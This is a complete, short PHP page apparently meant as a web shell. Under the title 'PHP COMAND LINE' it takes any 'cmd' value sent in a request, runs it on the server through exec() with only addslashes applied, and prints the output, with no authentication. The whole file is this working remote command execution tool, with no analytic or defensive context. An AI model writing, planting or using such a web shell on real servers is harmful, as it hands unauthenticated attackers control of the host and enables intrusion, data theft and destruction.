<!DOCTYPE HTML>
<html lang="pt-br">
   <head>
    <meta charset="utf-8">
       <title>Comand line</title>
      </head>
<body background="black">
   <hr>
   <center><p><font color="#00FF00">PHP COMAND LINE</font></p></center>
       <hr>
          <br>
 <form name="cmd" action="?" method="POST">
     <font color="#00FF00">cmd: </font><input type="text" name="cmd"  placeholder="Digite seu comando!" required/>
      <form>
         <br>
          <br>
     <hr>
     <?php
      if(isset($_REQUEST['cmd'])){
        $cmd = ADDSLASHES($_REQUEST['cmd']);
        exec($cmd, $output, $return_var); 
        foreach($output as $r){
            echo "<font color='#00FF00'>".$r.nl2br("\n\n")."</font>";
        }
      }
     ?> 
      <hr>
    </body>
       </html>
